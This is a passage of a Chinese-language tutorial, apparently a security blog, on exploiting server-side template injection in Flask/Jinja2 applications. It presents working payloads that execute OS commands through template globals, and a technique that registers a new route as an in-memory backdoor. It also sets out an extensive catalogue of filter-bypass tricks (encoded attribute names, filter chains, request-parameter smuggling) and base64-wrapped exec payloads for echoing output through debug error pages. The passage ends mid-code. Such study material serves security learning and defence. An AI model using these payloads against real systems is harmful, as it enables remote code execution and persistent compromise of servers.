class="line">&#123;&#123;namespace.__init__.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__.current_app.add_url_rule(&#x27;/1333337&#x27;,view_func=url_for.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;ls&#x27;).read)&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p>æ­¤å¤–ï¼Œå€ŸåŠ© Jinja2 æ¨¡æ¿æœ¬èº«å¯¹ <strong>æ§åˆ¶ç»“æ„</strong>ï¼ˆå¦‚ <code>for</code> å¾ªç¯ã€<code>if</code> æ¡ä»¶ï¼‰çš„æ”¯æŒï¼Œæˆ‘ä»¬è¿˜èƒ½ç›´æ¥åœ¨æ¨¡æ¿ä¸­å®ç°ä¼ ç»Ÿçš„è‡ªçœæœç´¢é€»è¾‘ï¼Œè‡ªåŠ¨éå†å¹¶å¯»æ‰¾å¯ç”¨çš„ç±»ï¼Œç„¶ååˆ©ç”¨å®ƒä»¬æ‰§è¡Œå‘½ä»¤ã€‚ä¾‹å¦‚ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="keyword">for</span>(x)<span class="keyword">in</span>().__class__.__base__.__subclasses__()%&#125;&#123;%<span class="keyword">if</span><span class="string">&#x27;war&#x27;</span><span class="keyword">in</span>(x).__name__ %&#125;&#123;&#123;x()._module.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;&#123;%endif%&#125;&#123;%endfor%&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿™æ ·ï¼Œå³ä½¿æˆ‘ä»¬äº‹å…ˆä¸çŸ¥é“ç¡®åˆ‡çš„ç±»åï¼Œä¹Ÿèƒ½åŠ¨æ€æœç´¢ç›®æ ‡ç±»å¹¶å®Œæˆåˆ©ç”¨ã€‚</p>
<h3 id="è¿‡æ»¤ç»•è¿‡"><a href="#è¿‡æ»¤ç»•è¿‡" class="headerlink" title="è¿‡æ»¤ç»•è¿‡"></a>è¿‡æ»¤ç»•è¿‡</h3><h4 id="é€šç”¨ç»•è¿‡æ–¹æ³•"><a href="#é€šç”¨ç»•è¿‡æ–¹æ³•" class="headerlink" title="é€šç”¨ç»•è¿‡æ–¹æ³•"></a>é€šç”¨ç»•è¿‡æ–¹æ³•</h4><p>é€šå¸¸æˆ‘ä»¬åœ¨ Jinja2 ä¸­è®¿é—®ä¸€ä¸ªå¯¹è±¡çš„å±æ€§çš„æ—¶å€™æ˜¯é€šè¿‡ <code>obj.attr</code> çš„æ–¹å¼æ¥è®¿é—®çš„ï¼Œå¦‚æœæ­¤æ—¶æœ‰å¯¹ <code>attr</code> æˆ–è€… <code>.</code> çš„è¿‡æ»¤ï¼Œåˆ™æˆ‘ä»¬å¾ˆéš¾è¿›è¡Œç»•è¿‡ã€‚</p>
<p>ç„¶è€Œ <strong>Jinja2 æ¨¡æ¿è¯­æ³•</strong> é‡Œï¼Œ<code>obj[&#39;attr&#39;]</code> å¹¶ä¸ç­‰ä»·äº Python çš„ä¸‹æ ‡æ“ä½œç¬¦ <code>__getitem__</code>ï¼Œè€Œæ˜¯èµ°å®ƒè‡ªå·±çš„ <strong>Attribute&#x2F;Item Lookup</strong> è§„åˆ™ï¼š</p>
<ol>
<li><strong>ä¼˜å…ˆå½“ä½œå±æ€§åè®¿é—®</strong> â†’ ç­‰ä»·äº <code>getattr(obj, &#39;attr&#39;)</code></li>
<li>å¦‚æœå±æ€§ä¸å­˜åœ¨ï¼Œå†å½“ä½œ <strong>å­—å…¸ key</strong> æŸ¥æ‰¾ â†’ ç­‰ä»·äº <code>obj[&#39;attr&#39;]</code></li>
<li>å¦‚æœè¿˜æ²¡æœ‰ï¼Œæ‰ä¼šå»çœŸæ­£è°ƒç”¨ Python å¯¹è±¡çš„ <code>__getitem__</code></li>
</ol>
<p>å› æ­¤æˆ‘ä»¬å¯ä»¥ç”¨ <code>obj[&#39;attr&#39;]</code> ä»£æ›¿ <code>obj.attr</code> æ¥ç»•è¿‡å¯¹ <code>.</code> çš„è¿‡æ»¤ï¼Œä¾‹å¦‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__&#125;&#125; â†’ &#123;&#123;&#x27;&#x27;[&#x27;__class__&#x27;]&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p>å¹¶ä¸”æ­¤æ—¶ <code>attr</code> æ˜¯å­—ç¬¦ä¸²çš„å½¢å¼ï¼Œå› æ­¤æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡ç¼–ç çš„å½¢å¼æ¥è¿›ä¸€æ­¥ç»•è¿‡å¯¹å±æ€§åçš„è¿‡æ»¤ï¼š</p>
<ul>
<li><p><strong>å­—ç¬¦ä¸²æ‹¼æ¥</strong> ï¼šå¦‚ <code>&#39;__class__&#39;</code> â†’ <code>&#39;__cla&#39; + &#39;ss__&#39;</code></p>
</li>
<li><p><strong>å­—ç¬¦ä¸²ç¼–ç </strong> ï¼šå½“é€šè¿‡ <code>[]</code> æˆ– <code>attr()</code> è®¿é—®å±æ€§æ—¶ï¼Œå±æ€§åæ˜¯ä½œä¸ºå­—ç¬¦ä¸²ä¼ é€’çš„ã€‚Jinja2 ä¼šå…ˆè§£æå¹¶è¿˜åŸè¿™äº›å­—ç¬¦ä¸²ä¸­çš„è½¬ä¹‰åºåˆ—ï¼ˆå¦‚ <code>\x..</code>ã€<code>\u....</code>ï¼‰ï¼Œå†å»æ‰§è¡Œå±æ€§è®¿é—®ï¼›ä½†æ˜¯å¯¹äº Python æœ¬èº«æ¥è¯´ç”±äºæ¥å—åˆ°çš„æ˜¯<strong>æ•´ä¸ªè¯·æ±‚å‚æ•°</strong>ï¼Œå› æ­¤æ— æ³•è¯†åˆ«å‡ºå†…éƒ¨å­—ç¬¦ä¸²çš„ç¼–ç ã€‚</p>
<ul>
<li>åå…­è¿›åˆ¶è½¬ä¹‰ï¼šå¦‚ <code>&#39;__class__&#39;</code> â†’ <code>&#39;\x5f\x5fclass\x5f\x5f&#39;</code></li>
<li>unicode è½¬ä¹‰ï¼šå¦‚ <code>&#39;__class__&#39;</code> â†’ <code>&#39;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&#39;</code></li>
</ul>
</li>
<li><p><strong>è¿‡æ»¤å™¨ç»•è¿‡</strong> ï¼šä½¿ç”¨ä¸€äº›å­—ç¬¦ä¸²å¤„ç†çš„è¿‡æ»¤å™¨æ¥è½¬æ¢å±æ€§åç»•è¿‡ã€‚</p>
<ul>
<li><code>reverse</code> è¿‡æ»¤å™¨ï¼šå­—ç¬¦ä¸²åè½¬ï¼Œå¦‚ <code>&#39;__class__&#39;</code> â†’ <code>&#39;__ssalc__&#39;|reverse</code></li>
<li><code>join</code> è¿‡æ»¤å™¨ï¼šå¦‚ <code>&#39;__class__&#39;</code> â†’ <code>dict(__cl=1, ass__=2)|join</code></li>
</ul>
</li>
<li><p><strong>è¯·æ±‚å‚æ•°ç»•è¿‡</strong> ï¼šç”±äº jinjia2 æ¨¡æ¿è¯­å¥å¯ä»¥ç›´æ¥è®¿é—®åˆ° <code>request</code> å¯¹è±¡ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ç›´æ¥ä» <code>request</code> å¯¹è±¡ä¸­æ‹¿è¯·æ±‚å‚æ•°ï¼ˆå¦‚ <code>get</code> ã€<code>form</code>ã€<code>headers</code> ç­‰ï¼‰ã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[request.args.a]&#125;&#125;&amp;a=__builtins__ </span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æç¤º</p>

    </div>
    <div class="notel-content markdown-body">
      <p>é€šè¿‡è¯·æ±‚å‚æ•°é¡ºä¾¿è¿˜ç»•è¿‡äº†å¯¹å•ã€åŒå¼•å·çš„è¿‡æ»¤ã€‚</p>

    </div>
  </div></li>
</ul>
<p>åœ¨ Jinja2 é‡Œï¼Œ<code>attr(name)</code> æ˜¯ä¸€ä¸ª <strong>å†…ç½®è¿‡æ»¤å™¨</strong>ï¼Œç”¨æ¥åŠ¨æ€è·å–å¯¹è±¡çš„å±æ€§ã€‚ç”±äºä¼ é€’æ˜¯å±æ€§å‚æ•°æ˜¯å­—ç¬¦ä¸²å½¢å¼ï¼Œå› æ­¤åŒæ ·å¯ä»¥é‡‡ç”¨ä¸Šè¿°è¿‡æ»¤æ€è·¯ã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__&#125;&#125; â†’ &#123;&#123;&#x27;&#x27;|attr(&#x27;__class__&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>è¿™é‡Œ <code>&#123;&#123;''|attr('__class__')&#125;&#125;</code> ç­‰ä»·äºï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">getattr</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;__class__&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
</blockquote>
<h4 id="ç‰¹æ®Šåœºæ™¯ç»•è¿‡"><a href="#ç‰¹æ®Šåœºæ™¯ç»•è¿‡" class="headerlink" title="ç‰¹æ®Šåœºæ™¯ç»•è¿‡"></a>ç‰¹æ®Šåœºæ™¯ç»•è¿‡</h4><h5 id="ç»•è¿‡ç‰¹å®šå­—ç¬¦"><a href="#ç»•è¿‡ç‰¹å®šå­—ç¬¦" class="headerlink" title="ç»•è¿‡ç‰¹å®šå­—ç¬¦"></a>ç»•è¿‡ç‰¹å®šå­—ç¬¦</h5><p><code>string</code> è¿‡æ»¤å™¨å¯ä»¥å°†å†…å®¹è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œç„¶å <code>list</code> å¯ä»¥å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºåˆ—è¡¨ï¼Œ<code>pop</code> å¯ä»¥å–å‡ºåˆ—è¡¨ä¸­ç‰¹å®šçš„ä¸€é¡¹ã€‚ç»“åˆèµ·æ¥å°±å¯ä»¥å¾—åˆ°è¢«è¿‡æ»¤çš„å­—ç¬¦ã€‚</p>
<p>ä¾‹å¦‚ç»•è¿‡å¯¹ä¸‹åˆ’çº¿ï¼ˆ<code>_</code>ï¼‰çš„è¿‡æ»¤ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set a = (()|select|string|list).pop(24) %&#125;&#123;% print(a) %&#125;</span><br></pre></td></tr></table></figure></div>

<p>å…·ä½“è¿‡ç¨‹ä¸ºï¼š</p>
<ol>
<li>ç©ºå…ƒç»„ <code>()</code> ä½œä¸º <code>select</code> çš„è¾“å…¥å¯è¿­ä»£å¯¹è±¡ã€‚</li>
<li><code>|select</code> æ˜¯ Jinja2 çš„ <strong>select è¿‡æ»¤å™¨</strong>ï¼ˆä» 3.x èµ·å®ç°ä¸ºç”Ÿæˆå™¨ï¼‰ã€‚å¯¹ç©ºå…ƒç»„ä½¿ç”¨å®ƒï¼Œä¼šå¾—åˆ°ä¸€ä¸ª <strong>generator</strong>ï¼ˆæ²¡æœ‰å…ƒç´ ï¼Œä½†å¯¹è±¡æœ¬èº«å­˜åœ¨ï¼‰ã€‚</li>
<li><code>|string</code> æŠŠè¿™ä¸ªç”Ÿæˆå™¨å¯¹è±¡è½¬æˆ<strong>å­—ç¬¦ä¸²è¡¨ç¤º</strong>ï¼ˆreprï¼‰ï¼Œå½¢å¦‚ï¼š<code>&quot;&lt;generator object select_or_reject at 0x7f...&gt;&quot;</code>ã€‚</li>
<li><code>|list</code> æŠŠè¿™æ®µå­—ç¬¦ä¸²æ‹†æˆ<strong>å­—ç¬¦åˆ—è¡¨</strong>ï¼Œç›¸å½“äºï¼š <code>[&#39;&lt;&#39;,&#39;g&#39;,&#39;e&#39;,&#39;n&#39;,&#39;e&#39;,&#39;r&#39;,&#39;a&#39;,&#39;t&#39;,&#39;o&#39;,&#39;r&#39;,&#39; &#39;,&#39;o&#39;,&#39;b&#39;,&#39;j&#39;,&#39;e&#39;,&#39;c&#39;,&#39;t&#39;,&#39; &#39;,&#39;s&#39;,&#39;e&#39;,&#39;l&#39;,&#39;e&#39;,&#39;c&#39;,&#39;t&#39;,&#39;_&#39;,&#39;o&#39;,&#39;r&#39;,&#39;_&#39;,&#39;r&#39;,&#39;e&#39;,&#39;j&#39;,&#39;e&#39;,&#39;c&#39;,&#39;t&#39;,&#39; &#39;, ...]</code></li>
<li><code>.pop(24)</code> ä»è¿™ä¸ªå­—ç¬¦åˆ—è¡¨é‡Œ <strong>å¼¹å‡ºç¬¬ 24 ä¸ªç´¢å¼•ä½ç½®</strong>çš„å­—ç¬¦ã€‚ç´¢å¼• 24 æ°å¥½è½åœ¨ <code>select_or_reject</code> ä¸­çš„é‚£ä¸ªä¸‹åˆ’çº¿ <code>_</code>ï¼Œäºæ˜¯æ‹¿åˆ°äº† <code>_</code>ã€‚</li>
<li><code>set a = ...</code> &#x2F; <code>print(a)</code> æŠŠè¿™ä¸ªå­—ç¬¦ä¿å­˜ä¸ºå˜é‡ <code>a</code>ï¼Œç„¶åæ‰“å°å‡ºæ¥</li>
</ol>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™ä¸ªæ‹›æ˜¯<strong>åˆ©ç”¨å‡½æ•°å¯¹è±¡çš„å­—ç¬¦ä¸²è¡¨ç¤ºé‡Œæ°å¥½æœ‰ä¸‹åˆ’çº¿</strong>ï¼Œä»è€Œâ€œæŠ â€å‡º <code>_</code>ã€‚åç»­åªéœ€è¦åœ¨å­—ç¬¦ä¸²è®¿é—®å±æ€§çš„æ–¹å¼çš„åŸºç¡€ä¸Š</p>
<h5 id="ç»•è¿‡-ï¼ˆæ–¹æ‹¬å·ï¼‰"><a href="#ç»•è¿‡-ï¼ˆæ–¹æ‹¬å·ï¼‰" class="headerlink" title="ç»•è¿‡ []ï¼ˆæ–¹æ‹¬å·ï¼‰"></a>ç»•è¿‡ <code>[]</code>ï¼ˆæ–¹æ‹¬å·ï¼‰</h5><p>æœ‰äº›é˜²å¾¡ä¼šç¦æ­¢åœ¨æ¨¡æ¿ä¸­ç›´æ¥å†™ä¸­æ‹¬å· <code>[]</code>ï¼Œæ¯”å¦‚ä¸‹é¢è¿™æ®µ payload è¢«è¿‡æ»¤æ‰å°±ä¸èƒ½è®¿é—®äº†ã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; ().__class__.__bases__[0] &#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p>ä½†åœ¨ Python é‡Œï¼Œ<code>obj[index]</code> çš„è¯­æ³•ç³–å…¶å®å°±æ˜¯åœ¨è°ƒç”¨ <code>obj.__getitem__(index)</code> æ–¹æ³•ã€‚æ‰€ä»¥ï¼Œå¦‚æœä¸èƒ½ç”¨ <code>[]</code>ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥è°ƒç”¨è¿™ä¸ªæ–¹æ³•æ¥è¾¾åˆ°åŒæ ·çš„æ•ˆæœï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; ().__class__.__bases__.__getitem__(0) &#125;&#125;</span><br></pre></td></tr></table></figure></div>

<h5 id="ç»•è¿‡åŒèŠ±æ‹¬å·"><a href="#ç»•è¿‡åŒèŠ±æ‹¬å·" class="headerlink" title="ç»•è¿‡åŒèŠ±æ‹¬å·"></a>ç»•è¿‡åŒèŠ±æ‹¬å·</h5><p><strong>å¦‚æœåŒèŠ±æ‹¬å·ï¼ˆè¡¨è¾¾å¼è¾“å‡ºï¼‰è¢«æ‹¦æˆªï¼Œå°±æŠŠâ€œè®¡ç®—&#x2F;æ‰§è¡Œâ€æ”¾åˆ° <code>&#123;% ... %&#125;</code>ï¼ˆæ§åˆ¶è¯­å¥å—ï¼‰é‡Œå®Œæˆ</strong>ã€‚</p>
<p><strong>æ§åˆ¶è¯­å¥å—</strong>ä¸èƒ½åƒ<strong>åŒèŠ±æ‹¬å·</strong>ä¸€æ ·å°†è¯­å¥æ‰§è¡Œç»“æœå›æ˜¾åˆ°é¡µé¢ä¸Šï¼Œä½†æ˜¯ æ”¯æŒ <code>print</code>ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å°†å‘½ä»¤æ‰§è¡Œè¯­å¥æ”¾åˆ° <code>&#123;% print(...) %&#125;</code> ä¸­ã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% print(g.pop.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()) %&#125;</span><br></pre></td></tr></table></figure></div>

<h5 id="ç»•è¿‡æ•°å­—"><a href="#ç»•è¿‡æ•°å­—" class="headerlink" title="ç»•è¿‡æ•°å­—"></a>ç»•è¿‡æ•°å­—</h5><p>å½“æ•°å­—è¢«è¿‡æ»¤æ—¶ï¼Œå¯ä»¥ä½¿ç”¨è¿‡æ»¤å™¨ <code>length</code>ï¼ˆæˆ–è€… <code>count</code>ï¼‰è®¡ç®—å­—ç¬¦ä¸²çš„é•¿åº¦ã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set a=&#x27;aaa&#x27;|length %&#125; &#123;&#123; a &#125;&#125;</span><br><span class="line">&#123;% set a=&#x27;aaa&#x27;|count %&#125; &#123;&#123; a &#125;&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="ä¸å‡ºç½‘å›æ˜¾"><a href="#ä¸å‡ºç½‘å›æ˜¾" class="headerlink" title="ä¸å‡ºç½‘å›æ˜¾"></a>ä¸å‡ºç½‘å›æ˜¾</h2><p>è¿™é‡Œä¸»è¦ç ”ç©¶å¦‚ä½•åœ¨èƒ½ <code>eval</code> æ‰§è¡Œä»»æ„ä»£ç çš„åŸºç¡€ä¸Šå®ç°å›æ˜¾</p>
<h3 id="debug-æ¨¡å¼ä¸‹åˆ©ç”¨æŠ¥é”™"><a href="#debug-æ¨¡å¼ä¸‹åˆ©ç”¨æŠ¥é”™" class="headerlink" title="debug æ¨¡å¼ä¸‹åˆ©ç”¨æŠ¥é”™"></a>debug æ¨¡å¼ä¸‹åˆ©ç”¨æŠ¥é”™</h3><p>åœ¨ Flask ä¸­ï¼Œå¦‚æœ <strong><code>debug=True</code></strong> ä¸”å¼‚å¸¸æœªè¢«æ•è·ï¼ŒWerkzeug çš„è°ƒè¯•é¡µé¢ä¼šæ˜¾ç¤ºå®Œæ•´çš„å¼‚å¸¸ä¿¡æ¯ï¼ˆå †æ ˆ + å¼‚å¸¸æ¶ˆæ¯ï¼‰ã€‚<br>åˆ©ç”¨è¿™ä¸€ç‰¹æ€§ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <strong>æŠ›å‡ºå¼‚å¸¸</strong>ï¼Œå°†å‘½ä»¤æ‰§è¡Œç»“æœä½œä¸ºå¼‚å¸¸æ¶ˆæ¯å›æ˜¾åˆ°æµè§ˆå™¨ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">raise</span> Exception(<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;whoami&#x27;</span>).read())</span><br></pre></td></tr></table></figure></div>

<p>ç”±äº <code>eval()</code> åªèƒ½æ‰§è¡Œ <strong>è¡¨è¾¾å¼</strong>ï¼Œä¸èƒ½ç›´æ¥æ‰§è¡Œ <code>raise</code>ã€<code>import</code> ç­‰è¯­å¥ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ç”¨ <code>eval</code> è°ƒç”¨ <code>exec</code>ï¼Œè€Œ <code>exec</code> å¯ä»¥æ‰§è¡Œä»»æ„ Python è¯­å¥ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;exec(&quot;raise Exception(123)&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<p>ä¸ºé¿å…å¼•å·ã€æ¢è¡Œç­‰å­—ç¬¦åœ¨ä¼ è¾“ä¸­è¢«æˆªæ–­ï¼Œå¯å°†å®é™…æ‰§è¡Œçš„ä»£ç  Base64 ç¼–ç ï¼Œå†ç”¨ <code>exec</code> è§£ç æ‰§è¡Œï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line">cmd = <span class="string">&quot;raise Exception(__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read())&quot;</span></span><br><span class="line">encoded = b64encode(cmd.encode()).decode()</span><br><span class="line">payload_code = <span class="string">f&#x27;exec(__import__(&quot;base64&quot;).b64decode(b&quot;<span class="subst">&#123;encoded&#125;</span>&quot;))&#x27;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="åˆ©ç”¨-HTTP-å“åº”å­—æ®µ"><a href="#åˆ©ç”¨-HTTP-å“åº”å­—æ®µ" class="headerlink" title="åˆ©ç”¨ HTTP å“åº”å­—æ®µ"></a>åˆ©ç”¨ HTTP å“åº”å­—æ®µ</h3><h2 id="å†…å­˜é©¬"><a href="#å†…å­˜é©¬" class="headerlink" title="å†…å­˜é©¬"></a>å†…å­˜é©¬</h2><h3 id="æ—§ç‰ˆæœ¬ï¼ˆâ‰¤-2-1-3ï¼‰"><a href="#æ—§ç‰ˆæœ¬ï¼ˆâ‰¤-2-1-3ï¼‰" class="headerlink" title="æ—§ç‰ˆæœ¬ï¼ˆâ‰¤ 2.1.3ï¼‰"></a>æ—§ç‰ˆæœ¬ï¼ˆâ‰¤ 2.1.3ï¼‰</h3>
  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æç¤º</p>

    </div>
    <div class="notel-content markdown-body">
      <p>ç”±äº <code>pip</code> ä¾èµ–é”™è¯¯ï¼Œæˆ‘ä»¬éœ€è¦æ‰‹åŠ¨æŒ‡å®šç›¸å…³ä¾èµ–çš„ç‰ˆæœ¬ï¼š</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">python -m pip install --upgrade --force-reinstall \</span><br><span class="line">  <span class="string">&quot;Flask==2.1.3&quot;</span> \</span><br><span class="line">  <span class="string">&quot;Werkzeug==2.0.3&quot;</span> \</span><br><span class="line">  <span class="string">&quot;Jinja2==3.0.3&quot;</span> \</span><br><span class="line">  <span class="string">&quot;MarkupSafe==2.0.1&quot;</span> \</span><br><span class="line">  <span class="string">&quot;click==8.0.4&quot;</span> \</span><br><span class="line">  <span class="string">&quot;itsdangerous==2.0.1&quot;</span></span><br><span class="line"></span><br><span class="line">python -m pip check</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install  <span class="literal">--upgrade</span> <span class="literal">--force-reinstall</span> Flask==<span class="number">2.1</span>.<span class="number">3</span> Werkzeug==<span class="number">2.0</span>.<span class="number">3</span> Jinja2==<span class="number">3.0</span>.<span class="number">3</span> MarkupSafe==<span class="number">2.0</span>.<span class="number">1</span> click==<span class="number">8.0</span>.<span class="number">4</span> itsdangerous==<span class="number">2.0</span>.<span class="number">1</span></span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<p>åœ¨ Flask ä¸­ï¼Œ<strong>è·¯ç”±</strong>å®é™…ä¸Šæ˜¯ç”± <code>app.add_url_rule()</code> å‡½æ•°æ·»åŠ çš„ï¼Œè¯¥å‡½æ•°å®šä¹‰å¦‚ä¸‹ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@setupmethod</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_url_rule</span>(<span class="params"></span></span><br><span class="line"><span class="params">    self,</span></span><br><span class="line"><span class="params">    rule: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    endpoint: t.<span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    view_func: t.<span class="type">Optional</span>[ft.ViewCallable] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    provide_automatic_options: t.<span class="type">Optional</span>[<span class="built_in">bool</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    **options: t.<span class="type">Any</span>,</span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    æ³¨å†Œä¸€ä¸ªæ–°çš„ URL è§„åˆ™åˆ° Flask åº”ç”¨çš„ URL æ˜ å°„è¡¨ä¸­ã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    è¿™ä¸ªæ–¹æ³•æ˜¯ Flask è·¯ç”±ç³»ç»Ÿçš„æ ¸å¿ƒåº•å±‚ APIï¼Œå¤§å¤šæ•°æƒ…å†µä¸‹ä½ ä¼šé€šè¿‡</span></span><br><span class="line"><span class="string">    @app.route() è£…é¥°å™¨é—´æ¥è°ƒç”¨å®ƒï¼Œä½†ä¹Ÿå¯ä»¥ç›´æ¥è°ƒç”¨æ¥åŠ¨æ€æ·»åŠ è·¯ç”±ã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    å‚æ•°:</span></span><br><span class="line"><span class="string">        rule (str):</span></span><br><span class="line"><span class="string">            URL è·¯å¾„è§„åˆ™ï¼Œä¾‹å¦‚ &quot;/user/&lt;int:id&gt;&quot;ã€‚</span></span><br><span class="line"><span class="string">            æ”¯æŒåŠ¨æ€å˜é‡ï¼ˆ&lt;converter:name&gt; æ ¼å¼ï¼‰å’Œé™æ€è·¯å¾„ã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        endpoint (str, å¯é€‰):</span></span><br><span class="line"><span class="string">            è§†å›¾å‡½æ•°çš„å”¯ä¸€æ ‡è¯†ç¬¦ï¼ˆåå­—ï¼‰ã€‚</span></span><br><span class="line"><span class="string">            å¦‚æœä¸æŒ‡å®šï¼ŒFlask ä¼šè‡ªåŠ¨ä½¿ç”¨ `view_func.__name__` ä½œä¸º endpointã€‚</span></span><br><span class="line"><span class="string">            endpoint ç”¨äºåå‘ç”Ÿæˆ URLï¼ˆurl_forï¼‰ã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        view_func (callable, å¯é€‰):</span></span><br><span class="line"><span class="string">            å¤„ç†è¯¥ URL 